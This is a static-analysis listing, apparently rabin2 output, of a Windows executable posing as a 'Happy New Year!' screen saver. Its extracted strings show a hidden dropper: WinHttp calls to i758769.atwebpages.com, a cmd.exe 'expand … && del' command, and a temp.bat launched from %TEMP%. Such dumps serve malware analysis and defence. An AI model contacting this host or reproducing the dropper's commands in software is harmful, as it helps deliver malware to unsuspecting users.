Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400   0x9800 0x00401000   0xa000 -r-x .text
1   0x00009c00   0x3c00 0x0040b000   0x4000 -r-- .rdata
2   0x0000d800   0x1200 0x0040f000   0x4000 -rw- .data
3   0x0000ea00  0x71600 0x00413000  0x72000 -r-- .rsrc
4   0x00080000   0x1c00 0x00485000   0x2000 -r-- .reloc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00402ecc paddr=0x000022cc haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Main]
vaddr=0x0040a613 paddr=0x00009a13
[Imports]
nth vaddr      bind type lib          name
18  0x00009ea0 0x0040b2a0 NONE FUNC 0    gdiplus.dll  imp.GdiplusShutdown
1   0x00009c10 0x0040b010 NONE FUNC 0    COMCTL32.dll imp.InitCommonControlsEx
1   0x00009c00 0x0040b000 NONE FUNC 0    ADVAPI32.dll imp.RegCloseKey
2   0x00009c04 0x0040b004 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExW
3   0x00009c08 0x0040b008 NONE FUNC 0    ADVAPI32.dll imp.RegQueryValueExW
[Strings]
nth  paddr      vaddr      len  size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x00009ef0 0x0040b2f0 23   24   .rdata  ascii   SetThreadStackGuarantee
1    0x00009f18 0x0040b318 14   15   .rdata  ascii   CorExitProcess
2    0x00009f28 0x0040b328 11   24   .rdata  utf16le mscoree.dll
3    0x00009f40 0x0040b340 14   30   .rdata  utf16le runtime error 
4    0x00009f68 0x0040b368 13   28   .rdata  utf16le TLOSS error\r\n
5    0x00009f84 0x0040b384 12   26   .rdata  utf16le SING error\r\n
6    0x00009fa0 0x0040b3a0 14   30   .rdata  utf16le DOMAIN error\r\n
7    0x00009fc0 0x0040b3c0 246  494  .rdata  utf16le R6033\r\n- Attempt to use MSIL code from this assembly during native code initialization\nThis indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.\r\n
8    0x0000a1b0 0x0040b5b0 50   102  .rdata  utf16le R6032\r\n- not enough space for locale information\r\n
9    0x0000a218 0x0040b618 98   198  .rdata  utf16le R6031\r\n- Attempt to initialize the CRT more than once.\nThis indicates a bug in your application.\r\n
10   0x0000a2e0 0x0040b6e0 30   62   .rdata  utf16le R6030\r\n- CRT not initialized\r\n
11   0x0000a320 0x0040b720 36   74   .rdata  utf16le R6028\r\n- unable to initialize heap\r\n
12   0x0000a370 0x0040b770 52   106  .rdata  utf16le R6027\r\n- not enough space for lowio initialization\r\n
13   0x0000a3e0 0x0040b7e0 52   106  .rdata  utf16le R6026\r\n- not enough space for stdio initialization\r\n
14   0x0000a450 0x0040b850 37   76   .rdata  utf16le R6025\r\n- pure virtual function call\r\n
15   0x0000a4a0 0x0040b8a0 52   106  .rdata  utf16le R6024\r\n- not enough space for _onexit/atexit table\r\n
16   0x0000a510 0x0040b910 40   82   .rdata  utf16le R6019\r\n- unable to open console device\r\n
17   0x0000a568 0x0040b968 32   66   .rdata  utf16le R6018\r\n- unexpected heap error\r\n
18   0x0000a5b0 0x0040b9b0 44   90   .rdata  utf16le R6017\r\n- unexpected multithread lock error\r\n
19   0x0000a610 0x0040ba10 43   88   .rdata  utf16le R6016\r\n- not enough space for thread data\r\n
20   0x0000a668 0x0040ba68 34   70   .rdata  utf16le R6010\r\n- abort() has been called\r\n
21   0x0000a6b0 0x0040bab0 43   88   .rdata  utf16le R6009\r\n- not enough space for environment\r\n
22   0x0000a708 0x0040bb08 41   84   .rdata  utf16le R6008\r\n- not enough space for arguments\r\n
23   0x0000a760 0x0040bb60 44   90   .rdata  utf16le R6002\r\n- floating point support not loaded\r\n
24   0x0000a86e 0x0040bc6e 37   76   .rdata  utf16le @Microsoft Visual C++ Runtime Library
25   0x0000a8cc 0x0040bccc 22   46   .rdata  utf16le <program name unknown>
26   0x0000a8fc 0x0040bcfc 25   52   .rdata  utf16le Runtime Error!\n\nProgram: 
27   0x0000a9d4 0x0040bdd4 12   26   .rdata  utf16le KERNEL32.DLL
28   0x0000a9f0 0x0040bdf0 7    8    .rdata  ascii   FlsFree
29   0x0000a9f8 0x0040bdf8 11   12   .rdata  ascii   FlsSetValue
30   0x0000aa04 0x0040be04 11   12   .rdata  ascii   FlsGetValue
31   0x0000aa10 0x0040be10 8    9    .rdata  ascii   FlsAlloc
32   0x0000aa1c 0x0040be1c 8    18   .rdata  utf16le HH:mm:ss
33   0x0000aa30 0x0040be30 19   40   .rdata  utf16le dddd, MMMM dd, yyyy
34   0x0000aa58 0x0040be58 8    18   .rdata  utf16le MM/dd/yy
35   0x0000aa7c 0x0040be7c 8    18   .rdata  utf16le December
36   0x0000aa90 0x0040be90 8    18   .rdata  utf16le November
37   0x0000aaa4 0x0040bea4 7    16   .rdata  utf16le October
38   0x0000aab4 0x0040beb4 9    20   .rdata  utf16le September
39   0x0000aac8 0x0040bec8 6    14   .rdata  utf16le August
40   0x0000aad8 0x0040bed8 4    10   .rdata  utf16le July
41   0x0000aae4 0x0040bee4 4    10   .rdata  utf16le June
42   0x0000aaf0 0x0040bef0 5    12   .rdata  utf16le April
43   0x0000aafc 0x0040befc 5    12   .rdata  utf16le March
44   0x0000ab08 0x0040bf08 8    18   .rdata  utf16le February
45   0x0000ab1c 0x0040bf1c 7    16   .rdata  utf16le January
46   0x0000ab8c 0x0040bf8c 8    18   .rdata  utf16le Saturday
47   0x0000aba0 0x0040bfa0 6    14   .rdata  utf16le Friday
48   0x0000abb0 0x0040bfb0 8    18   .rdata  utf16le Thursday
49   0x0000abc4 0x0040bfc4 9    20   .rdata  utf16le Wednesday
50   0x0000abd8 0x0040bfd8 7    16   .rdata  utf16le Tuesday
51   0x0000abe8 0x0040bfe8 6    14   .rdata  utf16le Monday
52   0x0000abf8 0x0040bff8 6    14   .rdata  utf16le Sunday
53   0x0000ac40 0x0040c040 8    9    .rdata  ascii   HH:mm:ss
54   0x0000ac4c 0x0040c04c 19   20   .rdata  ascii   dddd, MMMM dd, yyyy
55   0x0000ac60 0x0040c060 8    9    .rdata  ascii   MM/dd/yy
56   0x0000ac74 0x0040c074 8    9    .rdata  ascii   December
57   0x0000ac80 0x0040c080 8    9    .rdata  ascii   November
58   0x0000ac8c 0x0040c08c 7    8    .rdata  ascii   October
59   0x0000ac94 0x0040c094 9    10   .rdata  ascii   September
60   0x0000aca0 0x0040c0a0 6    7    .rdata  ascii   August
61   0x0000aca8 0x0040c0a8 4    5    .rdata  ascii   July
62   0x0000acb0 0x0040c0b0 4    5    .rdata  ascii   June
63   0x0000acb8 0x0040c0b8 5    6    .rdata  ascii   April
64   0x0000acc0 0x0040c0c0 5    6    .rdata  ascii   March
65   0x0000acc8 0x0040c0c8 8    9    .rdata  ascii   February
66   0x0000acd4 0x0040c0d4 7    8    .rdata  ascii   January
67   0x0000ad0c 0x0040c10c 8    9    .rdata  ascii   Saturday
68   0x0000ad18 0x0040c118 6    7    .rdata  ascii   Friday
69   0x0000ad20 0x0040c120 8    9    .rdata  ascii   Thursday
70   0x0000ad2c 0x0040c12c 9    10   .rdata  ascii   Wednesday
71   0x0000ad38 0x0040c138 7    8    .rdata  ascii   Tuesday
72   0x0000ad40 0x0040c140 6    7    .rdata  ascii   Monday
73   0x0000ad48 0x0040c148 6    7    .rdata  ascii   Sunday
74   0x0000ad6a 0x0040c16a 7    16   .rdata  utf16le n(null)
75   0x0000ad7c 0x0040c17c 6    7    .rdata  ascii   (null)
76   0x0000ada9 0x0040c1a9 7    8    .rdata  ascii   ( 8PX\a\b
77   0x0000adb1 0x0040c1b1 6    7    .rdata  ascii   700WP\a
78   0x0000adc0 0x0040c1c0 7    8    .rdata  ascii   \b`h````
79   0x0000adc9 0x0040c1c9 9    10   .rdata  ascii   xpxxxx\b\a\b
80   0x0000ade4 0x0040c1e4 23   24   .rdata  ascii   GetProcessWindowStation
81   0x0000adfc 0x0040c1fc 25   26   .rdata  ascii   GetUserObjectInformationW
82   0x0000ae18 0x0040c218 18   19   .rdata  ascii   GetLastActivePopup
83   0x0000ae2c 0x0040c22c 15   16   .rdata  ascii   GetActiveWindow
84   0x0000ae3c 0x0040c23c 11   12   .rdata  ascii   MessageBoxW
85   0x0000ae48 0x0040c248 10   22   .rdata  utf16le USER32.DLL
86   0x0000ae60 0x0040c260 25   26   .rdata  ascii    Complete Object Locator'
87   0x0000ae7c 0x0040c27c 28   29   .rdata  ascii    Class Hierarchy Descriptor'
88   0x0000ae9c 0x0040c29c 18   19   .rdata  ascii    Base Class Array'
89   0x0000aeb0 0x0040c2b0 27   28   .rdata  ascii    Base Class Descriptor at (
90   0x0000aecc 0x0040c2cc 17   18   .rdata  ascii    Type Descriptor'
91   0x0000aee0 0x0040c2e0 27   28   .rdata  ascii   `local static thread guard'
92   0x0000aefc 0x0040c2fc 42   43   .rdata  ascii   `managed vector copy constructor iterator'
93   0x0000af28 0x0040c328 40   41   .rdata  ascii   `vector vbase copy constructor iterator'
94   0x0000af54 0x0040c354 34   35   .rdata  ascii   `vector copy constructor iterator'
95   0x0000af78 0x0040c378 32   33   .rdata  ascii   `dynamic atexit destructor for '
96   0x0000af9c 0x0040c39c 26   27   .rdata  ascii   `dynamic initializer for '
97   0x0000afb8 0x0040c3b8 43   44   .rdata  ascii   `eh vector vbase copy constructor iterator'
98   0x0000afe4 0x0040c3e4 37   38   .rdata  ascii   `eh vector copy constructor iterator'
99   0x0000b00c 0x0040c40c 36   37   .rdata  ascii   `managed vector destructor iterator'
100  0x0000b034 0x0040c434 37   38   .rdata  ascii   `managed vector constructor iterator'
101  0x0000b05c 0x0040c45c 28   29   .rdata  ascii   `placement delete[] closure'
102  0x0000b07c 0x0040c47c 26   27   .rdata  ascii   `placement delete closure'
103  0x0000b098 0x0040c498 14   15   .rdata  ascii   `omni callsig'
104  0x0000b0a8 0x0040c4a8 9    10   .rdata  ascii    delete[]
105  0x0000b0b4 0x0040c4b4 6    7    .rdata  ascii    new[]
106  0x0000b0bc 0x0040c4bc 35   36   .rdata  ascii   `local vftable constructor closure'
107  0x0000b0e0 0x0040c4e0 15   16   .rdata  ascii   `local vftable'
108  0x0000b0f0 0x0040c4f0 5    6    .rdata  ascii   `RTTI
109  0x0000b0fc 0x0040c4fc 15   16   .rdata  ascii   `udt returning'
110  0x0000b10c 0x0040c50c 26   27   .rdata  ascii   `copy constructor closure'
111  0x0000b128 0x0040c528 38   39   .rdata  ascii   `eh vector vbase constructor iterator'
112  0x0000b150 0x0040c550 31   32   .rdata  ascii   `eh vector destructor iterator'
113  0x0000b170 0x0040c570 32   33   .rdata  ascii   `eh vector constructor iterator'
114  0x0000b194 0x0040c594 26   27   .rdata  ascii   `virtual displacement map'
115  0x0000b1b0 0x0040c5b0 35   36   .rdata  ascii   `vector vbase constructor iterator'
116  0x0000b1d4 0x0040c5d4 28   29   .rdata  ascii   `vector destructor iterator'
117  0x0000b1f4 0x0040c5f4 29   30   .rdata  ascii   `vector constructor iterator'
118  0x0000b214 0x0040c614 28   29   .rdata  ascii   `scalar deleting destructor'
119  0x0000b234 0x0040c634 29   30   .rdata  ascii   `default constructor closure'
120  0x0000b254 0x0040c654 28   29   .rdata  ascii   `vector deleting destructor'
121  0x0000b274 0x0040c674 18   19   .rdata  ascii   `vbase destructor'
122  0x0000b288 0x0040c688 8    9    .rdata  ascii   `string'
123  0x0000b294 0x0040c694 20   21   .rdata  ascii   `local static guard'
124  0x0000b2ac 0x0040c6ac 8    9    .rdata  ascii   `typeof'
125  0x0000b2b8 0x0040c6b8 7    8    .rdata  ascii   `vcall'
126  0x0000b2c0 0x0040c6c0 9    10   .rdata  ascii   `vbtable'
127  0x0000b2cc 0x0040c6cc 9    10   .rdata  ascii   `vftable'
128  0x0000b308 0x0040c708 11   48   .rdata  utf32le |^~⤨,㴾>㴼<%/ blocks=Basic Latin,Supplemental Arrows-B,CJK Unified Ideographs Extension A
129  0x0000b338 0x0040c738 7    32   .rdata  utf32le &+-ⴭ⬫*㸭 blocks=Basic Latin,Georgian Supplement,Miscellaneous Symbols and Arrows,CJK Unified Ideographs Extension A
130  0x0000b358 0x0040c758 4    5    .rdata  ascii   ator
131  0x0000b37c 0x0040c77c 7    8    .rdata  ascii    delete
132  0x0000b384 0x0040c784 4    5    .rdata  ascii    new
133  0x0000b38c 0x0040c78c 11   12   .rdata  ascii   __unaligned
134  0x0000b398 0x0040c798 10   11   .rdata  ascii   __restrict
135  0x0000b3a4 0x0040c7a4 7    8    .rdata  ascii   __ptr64
136  0x0000b3ac 0x0040c7ac 6    7    .rdata  ascii   __eabi
137  0x0000b3b4 0x0040c7b4 9    10   .rdata  ascii   __clrcall
138  0x0000b3c0 0x0040c7c0 10   11   .rdata  ascii   __fastcall
139  0x0000b3cc 0x0040c7cc 10   11   .rdata  ascii   __thiscall
140  0x0000b3d8 0x0040c7d8 9    10   .rdata  ascii   __stdcall
141  0x0000b3e4 0x0040c7e4 8    9    .rdata  ascii   __pascal
142  0x0000b3f0 0x0040c7f0 7    8    .rdata  ascii   __cdecl
143  0x0000b3f8 0x0040c7f8 8    9    .rdata  ascii   __based(
144  0x0000b690 0x0040ca90 33   68   .rdata  utf16le          (((((                  H
145  0x0000b892 0x0040cc92 33   68   .rdata  utf16le          h((((                  H
146  0x0000b990 0x0040cd90 34   70   .rdata  utf16le                                  H
147  0x0000bb1f 0x0040cf1f 7    8    .rdata  ascii   \a\b\t\n\v\f\r
148  0x0000bb38 0x0040cf38 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
149  0x0000bc9f 0x0040d09f 7    8    .rdata  ascii   \a\b\t\n\v\f\r
150  0x0000bcb8 0x0040d0b8 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
151  0x0000bdbd 0x0040d1bd 5    6    .rdata  ascii   ('8PW
152  0x0000bdc6 0x0040d1c6 5    6    .rdata  ascii   700PP
153  0x0000bdd8 0x0040d1d8 17   18   .rdata  ascii   `h`hhh\b\b\axppwpp\b\b
154  0x0000bdf8 0x0040d1f8 5    12   .rdata  utf16le NOUT$
155  0x0000be0e 0x0040d20e 7    8    .rdata  ascii   \a\b\t\n\v\f\r
156  0x0000be27 0x0040d227 95   96   .rdata  ascii    !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
157  0x0000be88 0x0040d288 21   44   .rdata  utf16le Control Panel\Desktop
158  0x0000beb4 0x0040d2b4 15   32   .rdata  utf16le ScreenSave_Data
159  0x0000bed4 0x0040d2d4 7    16   .rdata  utf16le MPR.DLL
160  0x0000bee4 0x0040d2e4 7    16   .rdata  utf16le SCRSAVE
161  0x0000bef4 0x0040d2f4 18   19   .rdata  ascii   PwdChangePasswordW
162  0x0000bf08 0x0040d308 18   19   .rdata  ascii   HeapSetInformation
163  0x0000bf1c 0x0040d31c 12   26   .rdata  utf16le Screen Saver
164  0x0000bf38 0x0040d338 7    16   .rdata  utf16le Preview
165  0x0000bf48 0x0040d348 23   48   .rdata  utf16le WindowsScreenSaverClass
166  0x0000bf80 0x0040d380 29   30   .rdata  ascii   Wow64EnableWow64FsRedirection
167  0x0000bfa0 0x0040d3a0 12   26   .rdata  utf16le kernel32.dll
168  0x0000bfbc 0x0040d3bc 6    14   .rdata  utf16le %TEMP%
169  0x0000bfd0 0x0040d3d0 32   66   .rdata  utf16le /index.php?user_id=18756&type=%d
170  0x0000c014 0x0040d414 22   46   .rdata  utf16le i758769.atwebpages.com
171  0x0000c048 0x0040d448 65   132  .rdata  utf16le cmd /c expand "%s" -F:* "%s" && del /f /q "%s" && echo OK > a.log
172  0x0000c0cc 0x0040d4cc 9    20   .rdata  utf16le \temp.bat
173  0x0000c0e0 0x0040d4e0 8    9    .rdata  ascii   %windir%
174  0x0000c0ec 0x0040d4ec 10   11   .rdata  ascii   \sysnative
175  0x0000c0f8 0x0040d4f8 9    10   .rdata  ascii   \system32
176  0x0000c104 0x0040d504 38   39   .rdata  ascii   \cmd.exe /c cd /d "%TEMP%" && temp.bat
177  0x0000c12c 0x0040d52c 15   32   .rdata  utf16le Happy New Year!
178  0x0000c150 0x0040d550 50   102  .rdata  utf16le This screen saver has no options that you can set.
179  0x0000c1b8 0x0040d5b8 9    20   .rdata  utf16le Happy.jpg
180  0x0000c1cc 0x0040d5cc 4    10   .rdata  utf16le JPEG
181  0x0000ca6e 0x0040de6e 10   11   .rdata  ascii   LocalAlloc
182  0x0000ca7c 0x0040de7c 11   12   .rdata  ascii   CreateFileW
183  0x0000ca8a 0x0040de8a 9    10   .rdata  ascii   WriteFile
184  0x0000ca96 0x0040de96 11   12   .rdata  ascii   CloseHandle
185  0x0000caa4 0x0040dea4 9    10   .rdata  ascii   LocalFree
186  0x0000cab0 0x0040deb0 14   15   .rdata  ascii   GetProcAddress
187  0x0000cac2 0x0040dec2 16   17   .rdata  ascii   GetModuleHandleW
188  0x0000cad6 0x0040ded6 25   26   .rdata  ascii   ExpandEnvironmentStringsW
189  0x0000caf2 0x0040def2 16   17   .rdata  ascii   GetTempFileNameW
190  0x0000cb06 0x0040df06 11   12   .rdata  ascii   DeleteFileW
191  0x0000cb14 0x0040df14 24   25   .rdata  ascii   GetSystemWow64DirectoryW
192  0x0000cb30 0x0040df30 14   15   .rdata  ascii   CreateProcessW
193  0x0000cb42 0x0040df42 19   20   .rdata  ascii   WaitForSingleObject
194  0x0000cb58 0x0040df58 25   26   .rdata  ascii   ExpandEnvironmentStringsA
195  0x0000cb74 0x0040df74 7    8    .rdata  ascii   WinExec
196  0x0000cb7e 0x0040df7e 11   12   .rdata  ascii   GetFileSize
197  0x0000cb8c 0x0040df8c 8    9    .rdata  ascii   ReadFile
198  0x0000cb98 0x0040df98 19   20   .rdata  ascii   InterlockedExchange
199  0x0000cbae 0x0040dfae 8    9    .rdata  ascii   lstrlenW
200  0x0000cbba 0x0040dfba 20   21   .rdata  ascii   EnterCriticalSection
201  0x0000cbd2 0x0040dfd2 20   21   .rdata  ascii   LeaveCriticalSection
202  0x0000cbea 0x0040dfea 12   13   .rdata  ascii   LoadResource
203  0x0000cbfa 0x0040dffa 12   13   .rdata  ascii   LockResource
204  0x0000cc0a 0x0040e00a 14   15   .rdata  ascii   SizeofResource
205  0x0000cc1c 0x0040e01c 13   14   .rdata  ascii   FindResourceW
206  0x0000cc2c 0x0040e02c 12   13   .rdata  ascii   CreateThread
207  0x0000cc3c 0x0040e03c 27   28   .rdata  ascii   SetUnhandledExceptionFilter
208  0x0000cc5a 0x0040e05a 12   13   .rdata  ascii   SetErrorMode
209  0x0000cc6a 0x0040e06a 12   13   .rdata  ascii   GetTempPathW
210  0x0000cc7a 0x0040e07a 12   13   .rdata  ascii   FreeResource
211  0x0000cc88 0x0040e088 12   13   .rdata  ascii   KERNEL32.dll
212  0x0000cc98 0x0040e098 16   17   .rdata  ascii   GetSystemMetrics
213  0x0000ccac 0x0040e0ac 10   11   .rdata  ascii   BeginPaint
214  0x0000ccba 0x0040e0ba 8    9    .rdata  ascii   EndPaint
215  0x0000ccc6 0x0040e0c6 15   16   .rdata  ascii   PostQuitMessage
216  0x0000ccd8 0x0040e0d8 11   12   .rdata  ascii   MessageBoxW
217  0x0000cce6 0x0040e0e6 9    10   .rdata  ascii   EndDialog
218  0x0000ccf0 0x0040e0f0 10   11   .rdata  ascii   USER32.dll
219  0x0000ccfe 0x0040e0fe 8    9    .rdata  ascii   DeleteDC
220  0x0000cd0a 0x0040e10a 18   19   .rdata  ascii   CreateCompatibleDC
221  0x0000cd20 0x0040e120 16   17   .rdata  ascii   CreateDIBSection
222  0x0000cd34 0x0040e134 12   13   .rdata  ascii   DeleteObject
223  0x0000cd44 0x0040e144 10   11   .rdata  ascii   StretchBlt
224  0x0000cd52 0x0040e152 12   13   .rdata  ascii   SelectObject
225  0x0000cd62 0x0040e162 16   17   .rdata  ascii   SetDIBColorTable
226  0x0000cd76 0x0040e176 10   11   .rdata  ascii   GetObjectW
227  0x0000cd82 0x0040e182 9    10   .rdata  ascii   GDI32.dll
228  0x0000cd8e 0x0040e18e 11   12   .rdata  ascii   WinHttpOpen
229  0x0000cd9c 0x0040e19c 14   15   .rdata  ascii   WinHttpConnect
230  0x0000cdae 0x0040e1ae 18   19   .rdata  ascii   WinHttpOpenRequest
231  0x0000cdc4 0x0040e1c4 18   19   .rdata  ascii   WinHttpSendRequest
232  0x0000cdda 0x0040e1da 22   23   .rdata  ascii   WinHttpReceiveResponse
233  0x0000cdf4 0x0040e1f4 25   26   .rdata  ascii   WinHttpQueryDataAvailable
234  0x0000ce10 0x0040e210 15   16   .rdata  ascii   WinHttpReadData
235  0x0000ce22 0x0040e222 18   19   .rdata  ascii   WinHttpCloseHandle
236  0x0000ce36 0x0040e236 11   12   .rdata  ascii   WINHTTP.dll
237  0x0000ce44 0x0040e244 8    9    .rdata  ascii   GdipFree
238  0x0000ce50 0x0040e250 9    10   .rdata  ascii   GdipAlloc
239  0x0000ce5c 0x0040e25c 16   17   .rdata  ascii   GdipDisposeImage
240  0x0000ce70 0x0040e270 27   28   .rdata  ascii   GdipGetImageGraphicsContext
241  0x0000ce8e 0x0040e28e 18   19   .rdata  ascii   GdipDeleteGraphics
242  0x0000cea4 0x0040e2a4 14   15   .rdata  ascii   GdipDrawImageI
243  0x0000ceb6 0x0040e2b6 14   15   .rdata  ascii   GdipCloneImage
244  0x0000cec8 0x0040e2c8 17   18   .rdata  ascii   GdipGetImageWidth
245  0x0000cedc 0x0040e2dc 18   19   .rdata  ascii   GdipGetImageHeight
246  0x0000cef2 0x0040e2f2 23   24   .rdata  ascii   GdipGetImagePixelFormat
247  0x0000cf0c 0x0040e30c 23   24   .rdata  ascii   GdipGetImagePaletteSize
248  0x0000cf26 0x0040e326 19   20   .rdata  ascii   GdipGetImagePalette
249  0x0000cf3c 0x0040e33c 24   25   .rdata  ascii   GdipCreateBitmapFromFile
250  0x0000cf58 0x0040e358 25   26   .rdata  ascii   GdipCreateBitmapFromScan0
251  0x0000cf74 0x0040e374 18   19   .rdata  ascii   GdipBitmapLockBits
252  0x0000cf8a 0x0040e38a 20   21   .rdata  ascii   GdipBitmapUnlockBits
253  0x0000cfa2 0x0040e3a2 14   15   .rdata  ascii   GdiplusStartup
254  0x0000cfb4 0x0040e3b4 15   16   .rdata  ascii   GdiplusShutdown
255  0x0000cfc4 0x0040e3c4 11   12   .rdata  ascii   gdiplus.dll
256  0x0000cfd2 0x0040e3d2 20   21   .rdata  ascii   InitCommonControlsEx
257  0x0000cfe8 0x0040e3e8 12   13   .rdata  ascii   COMCTL32.dll
258  0x0000cff8 0x0040e3f8 9    10   .rdata  ascii   HeapAlloc
259  0x0000d004 0x0040e404 12   13   .rdata  ascii   GetLastError
260  0x0000d014 0x0040e414 8    9    .rdata  ascii   HeapFree
261  0x0000d020 0x0040e420 14   15   .rdata  ascii   VirtualProtect
262  0x0000d032 0x0040e432 12   13   .rdata  ascii   VirtualAlloc
263  0x0000d042 0x0040e442 13   14   .rdata  ascii   GetSystemInfo
264  0x0000d052 0x0040e452 12   13   .rdata  ascii   VirtualQuery
265  0x0000d062 0x0040e462 15   16   .rdata  ascii   GetCommandLineA
266  0x0000d074 0x0040e474 18   19   .rdata  ascii   HeapSetInformation
267  0x0000d08a 0x0040e48a 15   16   .rdata  ascii   GetStartupInfoW
268  0x0000d09c 0x0040e49c 16   17   .rdata  ascii   TerminateProcess
269  0x0000d0b0 0x0040e4b0 17   18   .rdata  ascii   GetCurrentProcess
270  0x0000d0c4 0x0040e4c4 24   25   .rdata  ascii   UnhandledExceptionFilter
271  0x0000d0e0 0x0040e4e0 17   18   .rdata  ascii   IsDebuggerPresent
272  0x0000d0f4 0x0040e4f4 13   14   .rdata  ascii   DecodePointer
273  0x0000d104 0x0040e504 13   14   .rdata  ascii   EncodePointer
274  0x0000d114 0x0040e514 11   12   .rdata  ascii   ExitProcess
275  0x0000d122 0x0040e522 12   13   .rdata  ascii   GetStdHandle
276  0x0000d132 0x0040e532 18   19   .rdata  ascii   GetModuleFileNameW
277  0x0000d148 0x0040e548 10   11   .rdata  ascii   HeapCreate
278  0x0000d156 0x0040e556 11   12   .rdata  ascii   HeapReAlloc
279  0x0000d164 0x0040e564 8    9    .rdata  ascii   HeapSize
280  0x0000d170 0x0040e570 18   19   .rdata  ascii   GetModuleFileNameA
281  0x0000d186 0x0040e586 23   24   .rdata  ascii   FreeEnvironmentStringsW
282  0x0000d1a0 0x0040e5a0 19   20   .rdata  ascii   WideCharToMultiByte
283  0x0000d1b6 0x0040e5b6 22   23   .rdata  ascii   GetEnvironmentStringsW
284  0x0000d1d0 0x0040e5d0 14   15   .rdata  ascii   SetHandleCount
285  0x0000d1e2 0x0040e5e2 37   38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
286  0x0000d20a 0x0040e60a 11   12   .rdata  ascii   GetFileType
287  0x0000d218 0x0040e618 21   22   .rdata  ascii   DeleteCriticalSection
288  0x0000d230 0x0040e630 8    9    .rdata  ascii   TlsAlloc
289  0x0000d23c 0x0040e63c 11   12   .rdata  ascii   TlsGetValue
290  0x0000d24a 0x0040e64a 11   12   .rdata  ascii   TlsSetValue
291  0x0000d258 0x0040e658 7    8    .rdata  ascii   TlsFree
292  0x0000d262 0x0040e662 20   21   .rdata  ascii   InterlockedIncrement
293  0x0000d27a 0x0040e67a 12   13   .rdata  ascii   SetLastError
294  0x0000d28a 0x0040e68a 18   19   .rdata  ascii   GetCurrentThreadId
295  0x0000d2a0 0x0040e6a0 20   21   .rdata  ascii   InterlockedDecrement
296  0x0000d2b8 0x0040e6b8 23   24   .rdata  ascii   QueryPerformanceCounter
297  0x0000d2d2 0x0040e6d2 12   13   .rdata  ascii   GetTickCount
298  0x0000d2e2 0x0040e6e2 19   20   .rdata  ascii   GetCurrentProcessId
299  0x0000d2f8 0x0040e6f8 23   24   .rdata  ascii   GetSystemTimeAsFileTime
300  0x0000d312 0x0040e712 14   15   .rdata  ascii   SetFilePointer
301  0x0000d324 0x0040e724 12   13   .rdata  ascii   GetConsoleCP
302  0x0000d334 0x0040e734 14   15   .rdata  ascii   GetConsoleMode
303  0x0000d346 0x0040e746 9    10   .rdata  ascii   GetCPInfo
304  0x0000d352 0x0040e752 6    7    .rdata  ascii   GetACP
305  0x0000d35c 0x0040e75c 8    9    .rdata  ascii   GetOEMCP
306  0x0000d368 0x0040e768 15   16   .rdata  ascii   IsValidCodePage
307  0x0000d37a 0x0040e77a 5    6    .rdata  ascii   Sleep
308  0x0000d382 0x0040e782 19   20   .rdata  ascii   MultiByteToWideChar
309  0x0000d398 0x0040e798 11   12   .rdata  ascii   FreeLibrary
310  0x0000d3a6 0x0040e7a6 12   13   .rdata  ascii   LoadLibraryW
311  0x0000d3b6 0x0040e7b6 25   26   .rdata  ascii   IsProcessorFeaturePresent
312  0x0000d3d2 0x0040e7d2 9    10   .rdata  ascii   RtlUnwind
313  0x0000d3de 0x0040e7de 12   13   .rdata  ascii   SetStdHandle
314  0x0000d3ee 0x0040e7ee 13   14   .rdata  ascii   WriteConsoleW
315  0x0000d3fe 0x0040e7fe 12   13   .rdata  ascii   LCMapStringW
316  0x0000d40e 0x0040e80e 14   15   .rdata  ascii   GetStringTypeW
